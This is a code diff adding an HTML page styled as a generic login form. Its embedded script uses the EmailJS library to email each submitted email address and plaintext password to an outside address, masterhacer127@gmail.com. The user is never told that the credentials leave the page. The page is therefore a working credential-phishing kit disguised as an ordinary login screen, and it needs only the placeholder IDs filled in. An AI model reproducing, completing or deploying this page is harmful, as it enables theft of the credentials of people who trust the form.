@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: url('https://cdn.pixabay.com/photo/2017/01/06/19/15/car-1957037_1280.jpg') no-repeat center center/cover;
+      font-family: Arial, sans-serif;
+    }
+
+    .login-box {
+      background: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0, 255, 200, 0.8);
+      text-align: center;
+    }
+
+    .login-box h2 {
+      color: white;
+      margin-bottom: 20px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 10px;
+      background: linear-gradient(45deg, #00f, #0ff, #0f0);
+      color: white;
+      font-size: 18px;
+      cursor: pointer;
+      transition: 0.3s ease;
+      box-shadow: 0 0 15px #0ff;
+    }
+
+    .login-btn:hover {
+      box-shadow: 0 0 25px #0ff, 0 0 40px #0f0;
+      transform: scale(1.05);
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Login</h2>
+    <form id="login-form">
+      <input type="email" id="email" placeholder="Email" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit" class="login-btn">Login</button>
+    </form>
+  </div>
+
+  <!-- EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS User ID
+    })();
+
+    document.getElementById("login-form").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+        to_email: "masterhacer127@gmail.com",
+        from_email: document.getElementById("email").value,
+        message: "A login attempt was made with password: " + document.getElementById("password").value
+      }).then(
+        function(response) {
+          alert("Login info sent successfully!");
+        },
+        function(error) {
+          alert("Failed to send. Please try again.");
+        }
+      );
+    });
+  </script>
+</body>
+</html>
